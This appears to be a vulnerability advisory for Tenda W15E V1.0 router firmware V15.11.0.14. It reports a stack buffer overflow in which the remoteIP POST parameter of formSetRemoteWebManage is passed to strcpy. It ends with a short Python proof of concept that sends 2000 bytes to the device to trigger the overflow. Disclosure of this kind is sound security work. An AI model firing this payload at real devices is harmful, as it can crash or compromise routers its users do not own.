## Overview

- Firmware download website: https://www.tendacn.com/download/detail-2722.html

## Affected version

W15EV1.0 V15.11.0.14

## Vulnerability details

The Tenda W15EV1.0 V15.11.0.14 firmware has a stack overflow vulnerability in the `formSetRemoteWebManage` function. The `ip` variable receives the `remoteIP` parameter from a POST request and is used in statement `strcpy((char *)temp_value, (const char *)ip);`, which caused the buffer overflow attack.

![image-20240409130925063](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409130925063.png)

![image-20240409130854266](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409130854266.png)

![image-20240409130910804](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240409130910804.png)

The user-provided `remoteIP` can trigger this security vulnerability.

## POC

```python
import requests

IP = "192.168.84.101"
url = f"http://{IP}/goform/SetRemoteWebManage"
payload = b'a'*2000
data = {"remoteType": 1,"remoteIP": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240409110959426](C:\Users\杨浩然\AppData\Roaming\Typora\typora-user-images\image-20240409110959426.png)